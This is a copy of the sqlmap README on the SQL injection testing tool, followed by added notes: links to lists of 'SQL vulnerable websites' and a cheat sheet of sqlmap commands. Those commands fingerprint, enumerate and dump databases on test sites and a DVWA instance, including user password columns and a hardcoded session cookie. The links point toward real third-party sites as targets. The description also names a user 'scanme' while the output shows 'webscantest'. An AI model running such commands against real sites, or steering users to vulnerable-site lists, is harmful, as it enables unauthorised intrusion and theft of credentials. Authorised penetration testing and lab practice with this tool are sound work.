# Overview

[![Build Status](https://api.travis-ci.org/sqlmapproject/sqlmap.svg?branch=master)](https://api.travis-ci.org/sqlmapproject/sqlmap) [![Python 2.6|2.7](https://img.shields.io/badge/python-2.6|2.7-yellow.svg)](https://www.python.org/) [![License](https://img.shields.io/badge/license-GPLv2-red.svg)](https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/doc/COPYING) [![Twitter](https://img.shields.io/badge/twitter-@sqlmap-blue.svg)](https://twitter.com/sqlmap)

sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

# Screenshots
----

![Screenshot](https://raw.github.com/wiki/sqlmapproject/sqlmap/images/sqlmap_screenshot.png)

You can visit the [collection of screenshots](https://github.com/sqlmapproject/sqlmap/wiki/Screenshots) demonstrating some of features on the wiki.

# Installation
----

You can download the latest tarball by clicking [here](https://github.com/sqlmapproject/sqlmap/tarball/master) or latest zipball by clicking  [here](https://github.com/sqlmapproject/sqlmap/zipball/master).

Preferably, you can download sqlmap by cloning the [Git](https://github.com/sqlmapproject/sqlmap) repository:

    git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

sqlmap works out of the box with [Python](http://www.python.org/download/) version **2.6.x** and **2.7.x** on any platform.

# Usage
----

To get a list of basic options and switches use:

    python sqlmap.py -h

To get a list of all options and switches use:

    python sqlmap.py -hh

You can find a sample run [here](https://gist.github.com/stamparm/5335217).
To get an overview of sqlmap capabilities, list of supported features and description of all options and switches, along with examples, you are advised to consult the [user's manual](https://github.com/sqlmapproject/sqlmap/wiki).
# SQL VULNERABLE WEBSITES List 2016
http://www.allhackingtools.com/2015/02/SQL-VULNERABLE-websites-List.html

http://sqlinjectiondorks2016.blogspot.com/2016/06/sql-vulnerable-websites-list-2016.html
# Demo
http://www.webscantest.com/

## Determine the DBMS Behind the Web Site
./sqlmap.py -u "http://www.webscantest.com/datastore/search_get_by_id.php?id=4"
./sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1
## Find the Databases
./sqlmap.py -u "http://www.webscantest.com/datastore/search_get_by_id.php?id=4" --dbs
./sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
## Get More Info from the Database
./sqlmap.py -u "http://www.webscantest.com/datastore/search_get_by_id.php?id=4" --tables
./sqlmap.py -u "http://www.webscantest.com/datastore/search_get_by_id.php?id=4" --dbs --columns -D webscantest

./sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
./sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables --columns
## Enumerate the Database Users
./sqlmap.py -u "http://webscantest.com/datastore/search_get_by_id.php?id=4" --users
./sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns

**Output: &&
database management system users [1]:
[*] 'webscantest'@'%'

**Description:* In this case, the user "scanme" can login from any host or IP, as the database admin has used the wildcard "%" which means "any or none".

## Extract the Data
./sqlmap.py -u "http://www.webscantest.com/datastore/search_get_by_id.php?id=4" --dump -D webscantest -T orders
./sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dump -D acuart -T users -C email,name,pass 

##DVWA Example: http://resources.infosecinstitute.com/sql-injection/

1. Get cookie
2. ./sqlmap.py -u "https://sqlmap-dungdt.c9users.io/DVWA-1.9/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=arkk9hvnd6hi86uefdv1vrsts0; security=low"
3. Get Data

    * `./sqlmap.py -u "https://sqlmap-dungdt.c9users.io/DVWA-1.9/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=arkk9hvnd6hi86uefdv1vrsts0; security=low" --dbs --tables`
    * `./sqlmap.py -u "https://sqlmap-dungdt.c9users.io/DVWA-1.9/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=arkk9hvnd6hi86uefdv1vrsts0; security=low" -D dvwa -T users --dump`
